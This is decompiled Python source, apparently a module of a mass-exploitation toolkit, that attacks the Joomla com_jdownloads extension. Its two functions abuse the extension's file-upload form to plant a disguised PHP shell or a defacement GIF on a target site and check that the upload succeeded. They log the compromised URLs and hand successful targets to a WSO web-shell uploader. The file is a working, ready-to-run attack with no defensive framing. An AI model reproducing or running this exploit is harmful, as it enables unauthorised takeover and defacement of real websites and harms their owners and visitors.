# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\com_jdownloads.py
import requests
from Exploits import printModule
from Tools import wsoShellUploaderModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
ZipJd = 'files/jdownlods.zip'
jdShell = 'files/vuln.php3.j'
Jce_Deface_image = 'files/pwn.gif'

def Exploit(site):
    try:
        fileindex = {'file_upload': (ZipJd, open(ZipJd, 'rb'), 'multipart/form-data'),'pic_upload': (
                        jdShell, open(jdShell, 'rb'), 'multipart/form-data')
           }
        post_data = {'name': 'ur name',
           'mail': 'TTTntsfT@aa.com',
           'catlist': '1',
           'filetitle': 'lolz',
           'description': '<p>zot</p>',
           '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
           'send': 1,
           'senden': 'Send file',
           'description': '<p>qsdqsdqsdqsdqsdqsdqsd</p>',
           'option': 'com_jdownloads',
           'view': 'upload'
           }
        Exp = 'http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload'
        Got = requests.post(Exp, files=fileindex, data=post_data, timeout=10, headers=Headers)
        if '/upload_ok.png' in str(Got.content):
            checkUrl = 'http://' + site + '/images/jdownloads/screenshots/' + jdShell.split('/')[1]
            Check = requests.get(checkUrl, timeout=10, headers=Headers)
            if 'Vuln!!' in str(Check.content):
                ChecksHell = requests.get('http://' + site + '/images/vuln.php', timeout=10, headers=Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=10, headers=Headers)
                if 'Vuln!!' in str(ChecksHell.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/images/vuln.php' + '\n')
                    wsoShellUploaderModule.UploadWso2(site + '/images/vuln.php')
                if 'Vuln!!' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                    return printModule.returnYes(site, 'N/A', 'Com_Jdownloads', 'Joomla')
                else:
                    return Com_Jdownloads(site)

            else:
                return Com_Jdownloads(site)
        else:
            return Com_Jdownloads(site)
    except:
        return Com_Jdownloads(site)


def Com_Jdownloads(site):
    try:
        fileindex = {'file_upload': (ZipJd, open(ZipJd, 'rb'), 'multipart/form-data'),'pic_upload': (
                        Jce_Deface_image, open(Jce_Deface_image, 'rb'), 'multipart/form-data')
           }
        post_data = {'name': 'ur name',
           'mail': 'TTTnstT@aa.com',
           'catlist': '1',
           'filetitle': 'lolz',
           'description': '<p>zot</p>',
           '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
           'send': 1,
           'senden': 'Send file',
           'description': '<p>qsdqsdqsdqsdqsdqsdqsd</p>',
           'option': 'com_jdownloads',
           'view': 'upload'
           }
        Exp = 'http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload'
        Got = requests.post(Exp, files=fileindex, data=post_data, timeout=10, headers=Headers)
        if '/upload_ok.png' in str(Got.content):
            checkUrl = 'http://' + site + '/images/jdownloads/screenshots/' + Jce_Deface_image.split('/')[1]
            Check = requests.get(checkUrl, timeout=10, headers=Headers)
            if 'GIF89a' in str(Check.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(checkUrl + '\n')
                return printModule.returnYes(site, 'N/A', 'Com_Jdownloads', 'Joomla')
            else:
                return printModule.returnNo(site, 'N/A', 'Com_Jdownloads', 'Joomla')

        else:
            return printModule.returnNo(site, 'N/A', 'Com_Jdownloads', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_Jdownloads', 'Joomla')